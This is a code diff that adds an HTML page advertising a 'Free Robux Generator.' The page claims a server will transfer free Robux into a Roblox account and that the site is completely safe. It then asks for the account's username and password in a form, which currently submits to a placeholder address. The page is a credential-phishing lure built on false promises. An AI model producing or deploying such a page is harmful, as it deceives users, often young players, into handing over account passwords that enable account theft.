@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Free Robux Generator</h1>
+
+<h2>How does the Free Robux Generator works?</h2>
+<p2>After you logged in your ROBLOX account on our generator, and click on the "Generate Now" button, our server will immediately send request for free robux to ROBLOX's server, and free robux will be transfered into your ROBLOX account directly!</p2>
+<h2>Is it safe to use the Free Robux Generator?</h2>
+<p2>It is 100% safe to use our Free Robux Generator, we will remove 100% suspicious malwares on our site so you don't have to worry about it.</p2>
+
+<form action="https://google.com/" method="get">
+
+<fieldset>
+<legend>Free Robux Generator</legend>
+<label for="username">Username:</label>
+<input type="text" required name="username">
+<label for="password">Password:</label>
+<input type="password" required name="password">
+</fieldset>
+
+<input type="submit" value="Generate Now">
+
+</form>
+</body>
+</html>
